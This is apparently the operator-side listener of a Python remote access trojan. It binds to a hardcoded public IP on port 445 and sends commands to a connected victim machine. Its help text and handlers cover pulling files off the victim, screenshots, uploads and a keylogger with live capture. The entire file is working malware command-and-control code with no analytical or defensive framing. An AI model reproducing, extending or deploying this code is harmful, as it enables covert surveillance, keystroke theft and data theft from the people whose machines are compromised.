import socket, os

class listener(object):
    TCP_IP = '85.255.5.44'
    PORT = 445
    BUFFER_SIZE = 4096 * 2  # Normally 1024, but we want fast response

    def start(self):
        print "Listener Started"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.bind((self.TCP_IP, self.PORT))

        s.listen(5)
        connection, address = s.accept()

        while True:
            buf = connection.recv(self.BUFFER_SIZE)
            if len(buf) > 0:
                print buf
                buf = ""
                resp = raw_input() + "\n"

                if resp == "exit\n":
                    connection.sendall("quit\n")
                    connection.close()
                    os._exit(0)
                elif resp == "help\n":
                    print "start for start listener.\nstop for stop listener.\nstatus for status.\noptions for " \
                          "set options.\nexit for exit program\n"
                    print "admins for administrators.\nusers for users.\nwhelp for windows help.\n"
                    print "getFile(url to file) for download file from web."
                    print "download(path to file) for download file from host."
                    print "screenshot for create screenshot."
                    print "keylogger start for start keylogger."
                    print "keylogger stop for stop keylogger."
                    print "keylogger status for get keyloger status."
                    print "keylogger get for get captured data from keylogger."
                    print "keylogger live for live keylogging."
                elif resp == "clear\n":
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print "***************************************"
                    print "***************LISTENER****************"
                    print "***************************************"
                elif resp == "screenshot\n":
                    connection.sendall(resp)
                    data = connection.recv(4096)
                    print data
                    name = data[7:-8]
                    data = ""
                    while "finish" not in data:
                        data += connection.recv(150)
                    data = data[:-7]

                    fh = open(name, "wb")
                    # fh.write(data.decode('base64'))
                    fh.write(data)
                    fh.close()

                    resp = raw_input() + "\n"
                    connection.sendall(resp)

                elif resp.startswith("download("):
                    connection.sendall(resp)
                    data = connection.recv(4096)
                    print data
                    if "does not exists" not in data:
                        name = data[12:-3]
                        data = ""
                        while "finish" not in data:
                            data += connection.recv(150)
                        data = data[:-7]

                        fh = open(name, "wb")
                        fh.write(data)
                        fh.close()
                        print name+" successfully downloaded."

                    resp = raw_input()+"\n"
                    connection.sendall(resp)

                elif resp.startswith("upload("):
                    connection.sendall(resp)
                    data = connection.recv(4096)
                    if data == "ok":
                        name = resp[7:-2]
                        print name
                        if os.path.isfile(name):
                            print "Uploading "+name+"..."
                            with open(name, "rb") as file:
                                # Image_Str = base64.b64encode(imageFile.read())
                                File_Str = file.read()
                            fh = open("text", "wb")
                            fh.write(File_Str)
                            fh.close
                            fh = open("text", "rb")
                            str1 = fh.read(150)
                            connection.send(str1)
                            while str1:
                                str1 = fh.read(150)
                                connection.sendall(str1)
                            connection.sendall("6finish")

                            fh.close()
                            os.remove("text")
                            print name+" uploaded sucessfully."
                        else:
                            print name+" does not exists."

                elif resp.startswith("status"):
                        print "Listener running..."
                        resp = raw_input() + "\n"
                        connection.sendall(resp)

                else:
                    connection.sendall(resp)
            else:
                print "0"

    def setOptions(self,ipAddress,port):
        self.TCP_IP = ipAddress
        self.PORT = port
